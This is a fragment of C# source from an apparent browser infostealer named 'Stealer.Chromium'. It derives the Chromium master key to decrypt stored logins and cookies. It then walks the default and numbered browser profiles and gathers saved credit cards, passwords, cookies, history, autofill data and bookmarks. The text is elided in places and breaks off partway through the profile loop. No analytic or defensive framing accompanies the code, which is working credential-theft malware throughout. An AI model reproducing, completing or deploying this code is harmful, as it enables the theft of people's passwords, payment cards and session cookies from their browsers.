...
namespace Stealer.Chromium
{
    internal sealed class Crypto
    {
        ...
        public static string EasyDecrypt(string sLoginData, string sPassword, bool isCookie = false)
        {
            ...
            {
                string keyFolder = Directory.GetParent(sLoginData).Parent.FullName;
                if(isCookie) keyFolder = Directory.GetParent(keyFolder).FullName;
                byte[] bMasterKey = GetMasterKey(keyFolder);
        ...
        protected override void Load()
        {
            ...
            try
            {
                foreach (string sPath in Paths.sChromiumPswPaths)
                {
                    ...
                    string sProfile_default = sFullPath + "Default";
                    if (Directory.Exists(sProfile_default))
                    {
                        pCreditCards.AddRange(CreditCards.Get(sProfile_default + "\\Web Data"));
                        pPasswords.AddRange(Passwords.Get(sProfile_default + "\\Login Data"));
                        pCookies.AddRange(Cookies.Get(sProfile_default + "\\Network\\Cookies"));
                        pHistory.AddRange(History.Get(sProfile_default + "\\History"));
                        pAutoFill.AddRange(Autofill.Get(sProfile_default + "\\Web Data"));
                        pBookmarks.AddRange(Bookmarks.Get(sProfile_default + "\\Bookmarks"));
                    }

                    if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath, "Profile *"))
                    {
                        pCreditCards.AddRange(CreditCards.Get(sProfile + "\\Web Data"));
                        pPasswords.AddRange(Passwords.Get(sProfile + "\\Login Data"));
                        pCookies.AddRange(Cookies.Get(sProfile + "\\Network\\Cookies"));
